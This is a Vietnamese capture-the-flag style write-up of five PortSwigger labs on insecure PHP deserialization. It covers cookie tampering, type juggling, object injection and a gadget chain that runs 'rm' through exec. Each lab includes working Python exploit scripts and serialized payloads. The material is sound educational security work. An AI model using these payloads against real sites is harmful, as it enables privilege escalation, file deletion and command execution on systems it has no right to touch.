# Insecure deserialization

## Khái niệm & Tác hại & Khai thác & phòng tránh

**Trước hết tìm hiểu về khái niệm serialization và deserialization:**

<ul>
    <li><b>Serialization</b> là quá trình chuyển đối của một đối tượng thành định dạng như chuỗi byte, JSON, YAML,… Mục đích chính của quá trình này để dễ dàng lưu trữ và truyền dữ liệu giữa các ứng dụng.
</li>
    <li><b>Deserialization</b> là quá trình ngược lại với serialization để chuyển từ những định dạng dữ liệu trên thành đối tượng ban đầu.
    </li>
</ul>
<ul>
    <ul>
        <b>Khái niệm</b>
        <li>Insecure deserialization xảy ra khi ứng dụng web không kiểm tra và xác thực dữ liệu được gửi đến từ bên ngoài trước khi tiến hành giải mã dữ liệu đó. Điều này có thể dẫn đến việc kẻ tấn công gửi đến ứng dụng các dữ liệu giả mạo, chứa các đoạn mã độc hại và khi ứng dụng giải mã dữ liệu đó, đoạn mã độc hại sẽ được thực thi.</li>
    <img src="https://hackmd.io/_uploads/rkdUuOvFT.png">
        <li>Vậy nguyên nhân chính là do việc ứng dụng web để người dùng có thể kiểm soát được các dữ liệu sau khi serialize đối tượng nào đó (gọi là serialized data), khi thay đổi chúng ứng dụng sẽ thực hiện quá trình deserialization để khôi phục lại đối tượng ban đầu và đương nhiên đối tượng đó sẽ bị thay đổi và có thể gây ra ảnh hưởng tới ứng dụng</li>
        <li>Trong PHP, thực hiện quá trình serialization bằng hàm serialize(), và quá trình deserialization bằng hàm unserialize().</li>
    </ul>
    <ul>
        <b>Tác hại</b>
        <li>Thực thi các mã độc trên ứng dụng, có thể RCE.</li>
        <li>Thay đổi các thuộc tính đối tượng,...</li>
        <li>Gây tràn bộ nhớ ảnh hưởng tới ứng dụng và máy chủ.</li>
    </ul>
    <ul>
        <b>Khai thác</b> 
        <li>Sửa đổi đối tượng</li>
        <li>POP chain: 1 kỹ thuật liên quan đến việc sử dụng lại các đoạn code của chương trình (gọi là các gadget) để liên kết chúng lại thành 1 chuỗi thực thi (chain) đồng thời kết hợp với việc thay đổi các thuộc tính của các đối tượng tạo ra một luồng hoạt động với mục đích tấn công ứng dụng.</li>
        <li>Overflow</li>
        <li>Phar Deserialization</li>
    </ul>
    <ul>
        <b>Phòng chống</b>
        Tốt nhất là không dùng dữ liệu từ người dùng để thực hiện quá trình deserialization.
Tuy nhiên trong trường hợp phải dùng thì cần:
        <ul>
            <li>Xác mính tính toàn vẹn của dữ liệu ví dụ như dùng chữ ký số,...</li>
            <li>Giới hạn quyền truy cập, chạy ứng dụng trong quyền thấp.</li>
            <li>Kiểm tra đầu vào.</li>
            <li>Cập nhật các bản vá bảo mật cho các ứng dụng và hệ thống phần mềm để giảm thiểu các lỗ hổng bảo mật.</li>
        </ul>
    </ul>
</ul>

## 1. Lab: Modifying serialized objects

### Đề bài

![image](https://hackmd.io/_uploads/r1pcTqPFp.png)

### Phân tích

<ul>
    <li>đề bài yêu cầu chúng ta tận dụng lỗi Insecure deserialization ở cookie và leo thang đặc quyền để xóa người dùng là carlos
    </li>
    <li>mình đã đăng nhập bằng tài khoản <b>wiener:peter</b> rồi chặn gói tin ở burp suite và view details 1 sản phầm</li>
    <img src="https://hackmd.io/_uploads/rJfpHjwt6.png">
</ul>

và mình bắt được gói tin có chứa thông tin về cookie mà mình có thể thay đổi được

![image](https://hackmd.io/_uploads/SkBW8iPtp.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/r1Z_IsPFp.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>admin kiểu boolean với giá trị là 0 (false)</li>
    </ul>
    <li>vậy điều gì xảy ra nếu mình thay đổi được giá trị admin=1 trong cookie này, mình có leo thang đặc quyền lên admin không</li>
</ul>

### Khai thác

mình đã thay đổi giá trị của thuộc tính admin của đối tượng này và có được quyền admin

![image](https://hackmd.io/_uploads/rk25uiwFp.png)

![image](https://hackmd.io/_uploads/H1mXtiwY6.png)

mình chuyển đến trang admin và xóa người dùng carlos

![image](https://hackmd.io/_uploads/SJZX5ovYa.png)

![image](https://hackmd.io/_uploads/BJPo5iDFT.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0ac3002203c81af885c53ab3004800d2.web-security-academy.net'

session = requests.Session()

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data,
    verify=False
)

cookies = {
    'session': "%54%7a%6f%30%4f%69%4a%56%63%32%56%79%49%6a%6f%79%4f%6e%74%7a%4f%6a%67%36%49%6e%56%7a%5a%58%4a%75%59%57%31%6c%49%6a%74%7a%4f%6a%59%36%49%6e%64%70%5a%57%35%6c%63%69%49%37%63%7a%6f%31%4f%69%4a%68%5a%47%31%70%62%69%49%37%59%6a%6f%78%4f%33%30%3d",
}

response = session.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/S1trCsDK6.png)

chỉ còn delete wiener
![image](https://hackmd.io/_uploads/B1lQCsPKT.png)

mục đích của chúng ta đã hoàn thành khi trang web chuyển hướng chúng ta đến xóa carlos và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/r1Ld2sDF6.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/BkV11TDKp.png)

lỗi của bài là không có cơ chế kiểm soát đầu vào của người dùng ở cả bên client và server

## 2. Lab: Modifying serialized data types

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

### Đề bài

![image](https://hackmd.io/_uploads/By4rl6PKT.png)

### Phân tích

<ul>
    <li>đề bài yêu cầu chúng ta tận dụng lỗi Insecure deserialization ở cookie và leo thang đặc quyền để xóa người dùng là carlos
    </li>
    <li>mình đã đăng nhập bằng tài khoản <b>wiener:peter</b> rồi chặn gói tin ở burp suite và view details 1 sản phầm</li>
</ul>

và mình bắt được gói tin có chứa thông tin về cookie mà mình có thể thay đổi được

![image](https://hackmd.io/_uploads/BkMs0nwFp.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/SkrIypPY6.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>access_token kiểu string với giá trị là <b>pbjlw0fes41o8uwbj0657gcotm01e5jp</b></li>
    </ul>
    <li>với admin mình sẽ cần có một token khác mà mình không biết giá trị của nó là gì </li>
    <li>đề bài có gợi ý chúng ta về so sánh kiểu dữ liệu trong PHP</li>
</ul>

![image](https://hackmd.io/_uploads/SJ2lWpDYa.png)

với kiểu so sánh loose **"=="** trong PHP chúng ta có thể thấy 1 chuỗi sẽ bằng với số 0. PHP sẽ cố gắng tìm 1 chữ số trong chuỗi và nếu không có số nào nó sẽ tự ép kiểu sang kiểu số là 0 và sẽ trả về true nếu chúng ta thay đổi token của đối tượng

![image](https://hackmd.io/_uploads/ByN4-2uFp.png)

![image](https://hackmd.io/_uploads/r104ZndY6.png)

![image](https://hackmd.io/_uploads/rkOHZ3OK6.png)

![image](https://hackmd.io/_uploads/rJbIWn_FT.png)

### Khai thác

mình sửa lại thuộc tính và lấy được quyền admin

![image](https://hackmd.io/_uploads/HkRMz6DYT.png)

![image](https://hackmd.io/_uploads/B1PEQTDtT.png)

và tương tự bài trước mình xóa được carlos

![image](https://hackmd.io/_uploads/Bku14pPFp.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0ad80051032f412f875db2a9004800d1.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/ryBSThvYa.png)

delete success chỉ còn delete wiener

![image](https://hackmd.io/_uploads/rJFIpnvtp.png)

mục đích của chúng ta đã hoàn thành khi trang web chuyển hướng chúng ta đến xóa carlos và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/HJNWXnvt6.png)

lỗi của bài là không so sánh nghiệm ngặt kiểu dữ liệu trong PHP

## 3.Lab: Using application functionality to exploit insecure deserialization

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

### Đề bài

![image](https://hackmd.io/_uploads/Hy8IEpDFT.png)

### Phân tích

<ul>
    <li>đề bài yêu cầu chúng ta tận dụng lỗi Insecure deserialization ở cookie xóa file morale.txt của carlos và mình thử thay đổi token như bài trước nhưng không được có thể bài đã dùng <b>"==="</b> để so sánh nghiêm ngặt cả kiểu dữ liệu 
    </li>
    <img src = "https://hackmd.io/_uploads/Bk52UawY6.png">
    <li>mình đã đăng nhập bằng tài khoản <b>wiener:peter</b> rồi chặn gói tin ở burp suite và view details 1 sản phầm</li>
</ul>

và mình bắt được gói tin có chứa thông tin về cookie mà mình có thể thay đổi được

![image](https://hackmd.io/_uploads/HkLzrpwF6.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/rJ84rawK6.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>access_token kiểu string với giá trị là <b>pbjlw0fes41o8uwbj0657gcotm01e5jp</b></li>
        <li>avatar kiểu string có giá trị là đường dẫn thư mục đến avatar của wiener</li>
    </ul>
    <li>và mình có thể xóa được tài khoản của mình </li>
</ul>

![image](https://hackmd.io/_uploads/SkQmPawYp.png)

vậy điều gì xảy ra nếu mình upload avatar nhưng đường dẫn của nó trỏ đến file morale.txt của carlos

### Khai thác

`s:11:"avatar_link";s:23:"/home/carlos/morale.txt"`

mình sẽ thay đổi đường dẫn avatar đến thư mục cần xóa và sau đó xóa tài khoản của mình và thư mục của carlos cũng sẽ bị xóa theo

![image](https://hackmd.io/_uploads/rkt4aTDY6.png)

![image](https://hackmd.io/_uploads/S1f7RTwFT.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0a4900ad03613167814c9dd900600021.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'gregg',
    'password': 'rosebud',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"sqjois2i0db7c57ixs64wyh0kq797nm4";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.post(
    url + '/my-account/delete',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/BJe3A6PY6.png)

mục đích của chúng ta đã hoàn thành khi trang web chuyển hướng chúng ta đến xóa carlos và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/B1_thTwtp.png)

lỗi của bài này là không xác thực các đường dẫn thư mục thuộc về người đó trước khi xóa tài khoản

## 4. Lab: Arbitrary object injection in PHP

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

### Đề bài

![image](https://hackmd.io/_uploads/Bk-f-WOKa.png)

### Phân tích

<ul>
    <li>bài gợi ý chúng ta dùng <b>~</b> để đọc source code của file backup và tiêm một đối tượng vào chương trình qua lỗ hổng  Insecure deserialization để xóa file morale của người dùng Carlos</li>
    <li>tương tự những bài trước mình bắt được gói tin chứa cookie có thể thay đổi được</li>
    <img src ="https://hackmd.io/_uploads/SkHb4WdYT.png">
</ul>

![image](https://hackmd.io/_uploads/HkbBEb_FT.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>access_token kiểu string với giá trị là <b>l2enk5ty0uwtgfeyq8n1pdi80nrjwhm5</b></li>
    </ul>
</ul>

từ side map ở phần Target mình thấy có 1 file CustomTemplate.php và như đề bài gợi ý chúng ta cần đọc file này và tiêm vào 1 đối tượng

![image](https://hackmd.io/_uploads/H1gUUW_YT.png)

mình thêm ~ để đọc file backup

![image](https://hackmd.io/_uploads/SyEnLb_tp.png)

mã nguồn có nội dung:

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

<ul>
    file định nghĩa 1 class:
    <li>có 2 biến là $template_file_path, $lock_file_path</li>
    <li>đầu tiên đối tượng được tạo sẽ được khởi tạo giá trị: lock_file_path = $template_file_path . ".lock"</li>
    <li>Ta chỉ cần quan tâm magic method __destruct() khi nó thực hiện xóa file tại lock_file_path nếu nó tồn tại. Mặt khác __destruct() sẽ được gọi là server thực hiện deserialize.</li>
</ul>

Trong ngôn ngữ lập trình PHP, \_\_destruct() là một phương thức đặc biệt trong các lớp (classes) được sử dụng để thực hiện các công việc cuối cùng trước khi một đối tượng bị hủy (destroyed). Phương thức này tự động được gọi khi không còn đối tượng nào tham chiếu đến một đối tượng cụ thể nữa hoặc khi chương trình kết thúc.

Mục tiêu chính của \_\_destruct() là để giải phóng bất kỳ tài nguyên nào mà đối tượng có thể giữ, như đóng kết nối cơ sở dữ liệu, đóng tệp, giải phóng bộ nhớ, hoặc thực hiện bất kỳ việc dọn dẹp nào khác cần thiết trước khi đối tượng bị hủy.

<ul>
    <li>Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</li>
</ul>

```
O:14:"CustomTemplate":1{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Server sẽ thực hiện deserialize CustomTemplate object trên → hàm \_\_destruct() được kích hoạt → file /home/carlos/morale.txt bị xóa.

Gửi request với session cookie mới. Mặc dù server trả 500 vì invalid user nhưng payload trên đã được deserialize

![image](https://hackmd.io/_uploads/B1Nc0buFp.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0ac100c20301582f81ce454e00f300f8.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.get(
    url + '/product?productId=1',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Sk7a0bdYT.png)

mục đích của chúng ta đã hoàn thành và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/B1d9A-dta.png)

lỗi của bài này là đã để các hàm ảnh hưởng đến đối tượng nhưng không kiểm tra đầu vào khi chúng ta có thể tạo đối tượng tùy ý

## 5. Lab: Exploiting PHP deserialization with a pre-built gadget chain

### Đề bài

![image](https://hackmd.io/_uploads/ByTXfp_Ya.png)

### Phân tích

tương tự những bài trước mình bắt được gói tin

![image](https://hackmd.io/_uploads/r1KBwp_ta.png)

![image](https://hackmd.io/_uploads/H1Wjvadt6.png)

mình thấy vẫn có đối tượng User có

<ul>
    <li>accessToken</li>
    <li>username</li>
</ul>

![image](https://hackmd.io/_uploads/H1ZWupuF6.png)

vào site map mình thấy có file CustomTemplate.php

![image](https://hackmd.io/_uploads/ry48OT_Yp.png)

mình thêm **~** và đọc được file backup là:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

Đây là định nghĩa của class CustomTemplate kèm theo các class phụ khác. Ta sẽ phân tích như sau để tạo gadget chain:

<ul>
    <li>Một DefaultMap object khi gọi đến một thuộc tính không tồn tại hay inaccessible thì __get($name) được gọi → call_user_func($callback, $name) được gọi.</li>
    <li>khi một serialized CustomTemplate object được deserialize</li>
    <ul>
        <li>Hàm __wakeup() được gọi → Hàm build_product() được gọi</li>
        <li>Tại hàm build_product() khởi tạo một object Product($default_desc_type, $desc) → Hàm __construct() của class Product được gọi → $desc->$default_desc_type được gọi.</li>
        <li>Như vậy nếu như $desc là một DefaultMap object và $default_desc_type chính là tham số $name trong hàm __get(), thì $desc->$default_desc_type sẽ trở thành call_user_func($callback, $default_desc_type);</li>
        <li>Và khi đó, nếu callback là 1 hàm như eval hay exec, ta có thể thực thi lệnh OS với câu lệnh chính là $default_desc_type</li>
    </ul>
</ul>

### Khai thác

Dựa vào phân tích trên, ta tạo đoạn code generate payload như sau để xóa file /home/carlos/morale.txt:

```php
<?php

class DefaultMap {
    public $callback;
}

class CustomTemplate {
    public $default_desc_type;
    public $desc;
}

$b = new DefaultMap();
$b->callback = "exec";

$a = new CustomTemplate();
$a->default_desc_type = "rm /home/carlos/morale.txt";
$a->desc = $b;

$payload = serialize($a);
print_r($payload);
?>
```

![image](https://hackmd.io/_uploads/HJgKBadF6.png)

Thực thi đoạn code trên và mình có payload là 1 serialized CustomTemplate object.

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

tương tự các bài trước mình encode url và base64 và gửi lại gói tin đã sửa cookie vào burp suite và giải quyết được bài lab

mình đã viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0a4400490495946f85c3ad2e001000d0.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa file của carlos
response = requests.get(
    url + '/product?productId=1',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/H1cRIp_Kp.png)

mục đích của chúng ta đã hoàn thành và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/S1YuUTdF6.png)
